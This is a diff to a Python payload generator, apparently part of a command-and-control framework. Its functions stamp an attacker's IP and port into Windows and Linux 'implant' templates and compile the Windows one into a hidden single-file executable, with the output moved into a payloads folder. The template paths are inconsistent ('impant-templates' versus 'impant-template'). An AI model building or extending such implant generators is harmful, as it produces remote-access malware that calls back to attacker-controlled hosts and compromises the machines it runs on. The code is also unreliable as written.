@@ -17,22 +17,22 @@ def winplant():
     random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{random_name}.py'
     check_cwd = os.getcwd()
-    if os.path.exists(f'{check_cwd}/winplant.py'):
-        shutil.copy('winplant.py', file_name)
+    if os.path.exists(f'{check_cwd}/impant-templates/winplant.py'):
+        shutil.copy('impant-template/winplant.py', 'payloads/'+file_name)
     else:
         print('[-] winplant.py file not found.')
-    with open(file_name) as f:
+    with open('payloads/'+file_name) as f:
         new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(file_name, 'w') as f:
+    with open('payloads/'+file_name, 'w') as f:
         f.write(new_host)
         f.close()
-    with open(file_name) as f:
+    with open('payloads/'+file_name) as f:
         new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(file_name, 'w') as f:
+    with open('payloads/'+file_name, 'w') as f:
         f.write(new_port)
         f.close()
-    if os.path.exists(f'{file_name}'):
-        print(f'[+] {file_name} saved to {check_cwd}')
+    if os.path.exists(f'payloads/{file_name}'):
+        print(f'[+] {file_name} saved to {check_cwd}/payloads/')
     else:
         print('[-] Some error occurred with generation.')
 
@@ -41,23 +41,22 @@ def linplant():
     random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{random_name}.py'
     check_cwd = os.getcwd()
-    if os.path.exists(f'{check_cwd}/linplant.py'):
-        print(f'{check_cwd}')
-        shutil.copy('linplant.py', file_name)
+    if os.path.exists(f'{check_cwd}/implant-templates/linplant.py'):
+        shutil.copy('implant-templates/linplant.py', 'payloads/'+file_name)
     else:
-        print(f'[-] {check_cwd} / linplant.py file not found.')
-    with open(file_name) as f:
+        print(f'[-] {check_cwd}/implant-templates/linplant.py file not found.')
+    with open('payloads/'+file_name) as f:
         new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(file_name, 'w') as f:
+    with open('payloads/'+file_name, 'w') as f:
         f.write(new_host)
         f.close()
-    with open(file_name) as f:
+    with open('payloads/'+file_name) as f:
         new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(file_name, 'w') as f:
+    with open('payloads/'+file_name, 'w') as f:
         f.write(new_port)
         f.close()
-    if os.path.exists(f'{file_name}'):
-        print(f'[+] {file_name} saved to {check_cwd}')
+    if os.path.exists(f'payloads/{file_name}'):
+        print(f'[+] {file_name} saved to {check_cwd}/payloads/')
     else:
         print('[-] Some error occurred with generation.')
 
@@ -67,32 +66,33 @@ def exeplant():
     file_name = f'{random_name}.py'
     exe_file = f'{random_name}.exe'
     check_cwd = os.getcwd()
-    if os.path.exists(f'{check_cwd}/winplant.py'):
-        shutil.copy('winplant.py', file_name)
+    if os.path.exists(f'{check_cwd}/implant-templates/winplant.py'):
+        shutil.copy('implant-templates/winplant.py', 'payloads/'+file_name)
     else:
         print('[-] winplant.py file not found.')
-    with open(file_name) as f:
+    with open('payloads/'+file_name) as f:
         new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(file_name, 'w') as f:
+    with open('payloads/'+file_name, 'w') as f:
         f.write(new_host)
         f.close()
-    with open(file_name) as f:
+    with open('payloads/'+file_name) as f:
         new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(file_name, 'w') as f:
+    with open('payloads/'+file_name, 'w') as f:
         f.write(new_port)
         f.close()
-    if os.path.exists(f'{file_name}'):
-        print(f'[+] {file_name} saved to {check_cwd}')
+    if os.path.exists(f'payloads/{file_name}'):
+        print(f'[+] {file_name} saved to {check_cwd}/payloads')
     else:
         print('[-] Some error occured during generation')
-
+    os.chdir(check_cwd + '/payloads/')
     pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
     print(f'[+] Compiling executable {exe_file}...')
     subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
     os.remove(f'{random_name}.spec')
+    os.remove(f'{random_name}.py')
     shutil.rmtree('build')
-    if os.path.exists(f'{check_cwd}/{exe_file}'):
-        print(f'[+] {exe_file} saved to current directory.')
+    if os.path.exists(f'{check_cwd}/payloads/{exe_file}'):
+        print(f'[+] {exe_file} saved to {check_cwd}/payloads/.')
     else:
         print('[-] Some error occured during generation.')
 
